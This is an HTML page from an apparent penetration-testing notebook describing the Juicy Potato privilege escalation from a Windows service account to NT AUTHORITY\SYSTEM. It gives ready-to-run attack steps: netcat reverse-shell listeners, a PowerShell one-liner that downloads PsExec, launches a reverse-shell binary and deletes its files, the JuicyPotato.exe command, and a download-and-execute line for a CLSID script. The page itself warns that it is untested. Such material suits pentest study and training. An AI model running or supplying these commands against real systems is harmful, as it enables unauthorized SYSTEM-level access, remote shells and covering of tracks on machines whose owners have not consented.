<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Juicy Potato: RPC + NTLM relay</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Juicy Potato: RPC + NTLM relay</h1><br /><span style="color:#ff0000;">WARNING: NOT
      TESTED</span><br /><br /><strong>
      <h2>Prerequisites</h2>
    </strong><br />• <strong>OS Prerequisite:</strong><br /> ◇ Windows OS &lt; Windows 10 1809 <br /> ◇ Windows OS &lt;
    Windows Server 2019<br />• <strong>User privileges prerequisite:</strong><br />We need to be able to spawn a shell
    with Service Account privilege. <br />This because Service Accounts have “SeImpersonatePrivilege” privilege
    enabled<br /><span style="text-decoration:underline;">How get a Service Account&#39;s shell?</span><br /> ◇ MSSQL
    Injection → use xp_cmdshell procedure that run command as the SQL Server service account<br /> ◇ Since IIS runs with
    the permission of a Service Account, if we are able to run ASPX code on the Web Server, we can get a reverse shell
    running as Service account<br /> <br /><strong>Vulnerability:</strong><br />• This is a Privilege Escalation from a
    <span style="text-decoration:underline;">Windows Service Accounts</span> to <span
      style="text-decoration:underline;">NT AUTHORITY\SYSTEM</span><br />• <a
      href="Penetration_Test_Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--2._Service_Exploits.html">Service
      accounts</a> can be given special privileges in order for them to run their services, and cannot be logged into
    directly. Multiple problems have been found with service accounts, making them easier to escalate privileges
    with.<br />• Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was
    possible because Service Accounts usually have the “SeImpersonatePrivilege” privilege
    enabled.<br /><br /><br />GitHub: <a
      href="https://github.com/ohpe/juicy-potato" target="_blank">https://github.com/ohpe/juicy-potato</a><br />Juicy Potato is <a
      href="Spoofing-Poisoning--NetNTLM_attacks--Man-in-the-Middle_techniques_(IPv4)--Juicy_Potato_RPC_+_NTLM_relay--Rotten_Potato_(see_Juicy_Potato).html">Rotten
      Potato</a> on steroids. It allows a more flexible way to exploit the vulnerability. <br /><br /><strong>Advantages
      over Rotten Potato exploit</strong><br />• We do not need to have a meterpreter shell<br />• We can specify our
    COM(communication port) server listen port with CLSID<br /> ◇ CLSID is a globally unique identifier that identifies
    a COM class object. It is an identifier like UUID.<br /><br /><br /><strong><span style="color:#a5452a;">example
        with Windows 7</span></strong> (running with Administrative shell <strong><span
        style="text-decoration:underline;">only for demonstration</span></strong>)<br />1. Copy PSExec64.exe and the
    JuicyPotato.exe exploit executable over to Windows.<br />2. Start a listener on the attacker machine<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br />4. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the
    LOCAL SERVICE account:<br /> &quot;LOCAL SERVICE&quot; user account is a built in service account in windows<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/PSTools.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;md&nbsp;$env:userprofile\desktop\files;&nbsp;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\files&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\files\PSExec.exe&nbsp;-accepteula&nbsp;-i&nbsp;-u&nbsp;&#39;nt&nbsp;authority\local&nbsp;service&#39;&nbsp;&#39;C:\PrivEsc\reverse.exe&#39;&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\files&quot;&nbsp;-recurse;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;
      </div>
    </div> <br />5. Now on the listener of the Attacker we should have a shell as <span
      style="text-decoration:underline;">LOCAL SERVICE account</span><br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;whoami<br />C:\&gt;&nbsp;whoami&nbsp;/priv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;check&nbsp;privileges
      </div>
    </div><br /> we need one of the following privilege:<br /> ◇ SeAssignPrimaryPrivilege
    (SeAssignPrimaryTokenPrivilege)<br /> ◇ SeImpersonatePrivilege <br /> <a href=""><img src="images/1342-1.png"
        alt="images/1342-1.png" /></a><br />8. Start a new listener always on the attacker machine<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br />9. Run the Juicy Potato exploit to trigger a reverse shell running with SYSTEM privileges<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;.\JuicyPotato.exe&nbsp;-l&nbsp;1337&nbsp;-p&nbsp;C:\PrivEsc\reverse.exe&nbsp;-t&nbsp;*&nbsp;-c&nbsp;<span
          style="color:#000000;font-weight:400">{</span>03ca98d6-ff5d-49b8-abc6-03dd84127020<span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br /> If CLSID {03ca98d6-ff5d-49b8-abc6-03dd84127020} doesn’t work:<br /> ◇ check this list for different
    Windows OSs: <a
      href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md" target="_blank">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br />
    ◇ or execute GetCLSID.ps1 PowerShell script to get the CLSID<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1&quot;,&nbsp;&quot;$env:userprofile\desktop\GetCLSID.ps1&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\GetCLSID.ps1&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\GetCLSID.ps1&quot;;
      </div>
    </div><br /><br /><br /><strong><span style="color:#a5452a;"><br /><br /></span></strong>
  </div>
</body>

</html>